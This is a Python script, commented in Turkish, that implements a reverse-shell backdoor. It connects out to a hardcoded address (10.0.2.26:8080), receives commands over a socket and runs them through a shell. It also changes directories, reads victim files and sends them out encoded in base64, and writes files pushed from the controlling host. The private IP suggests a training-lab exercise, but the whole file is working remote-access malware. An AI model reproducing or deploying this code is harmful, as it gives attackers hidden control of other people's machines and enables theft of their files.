import socket
import subprocess
import simplejson
import os 
import base64 #resimleri açmak için

class Socket:

	def __init__(self,ip,port):

		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
		#hangi ağ ailesi ile çalışacaksın ve hangi yolla verileri transfer edeceksin

		self.my_connection.connect((ip,port))  #bu ip deki target a bu port üzerinden bağlan tuple içerisinde istiyor

		#buraya kadar iki bilgisayar arasında bir port üzerinden bağlantı kurduk

	def command_ex(self,command):
		return subprocess.check_output(command, shell=True)  #aldığımız veriyi burada çalıştırıyoruz ve sonucu bastırıyoz

	def json_send(self,data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))


	def json_recieve(self):
		json_data_rc = ""
		while True:
			try:
				json_data_rc = json_data_rc + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data_rc)
			except ValueError:
				continue

	def ex_cd_command(self,directory):
		os.chdir(directory)  #cd deki işlemi yapıyor başka klasöre gitmek için cd .. gibi
		return "cd to" + directory

	#aşağıdaki kodda ise dosyaların içindeki okumak için yazıyoruz sonra kendimize atacaz bunları
	#dosya text dosyası da olmayabilir o yüzden binary olarak açıyoruz resim falan
	def read_files_content(self,files): 
		with open(files,"rb") as the_file:
			return base64.b64encode(the_file.read()) #resimleri açmak için bu fonksiyonu kullandık

	#aşağıdaki kodda ise karşıdan dosya almak için yani oradan dosya yüklücez win e 
	def save_file(self,files,content):
		with open(files,"wb") as the_file:
			the_file.write(base64.b64decode(content))
			return "upload ok"

	#burada kodu başlatma fonksiyonu ve bnunun içinden dönyüyor her şey
	def start_socket(self):

		while True:
			command = self.json_recieve() #benim bağlantımdan veri al diyoruz kaç bytlık
			try:
				if command[0] == "exit":
					self.my_connection.close()
					exit()

				elif command[0] == "cd" and len(command) > 1:
					command_output = self.ex_cd_command(command[1])  #o dosyalar gitmek için bunu yazarsa fonksiyonu çalıştır

				elif command[0] == "download":
					command_output = self.read_files_content(command[1]) #download tan sonra yazılan şeyi açıp okucaz

				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2])

				else:
					command_output = self.command_ex(command) #bastırılan sonucu burada bir objeye tanımladık

			except Exception:
				command_output = "Error!!!"

			self.json_send(command_output)    #soucu gönderdik

		self.my_connection.close()


socket_object = Socket("10.0.2.26",8080)
socket_object.start_socket()




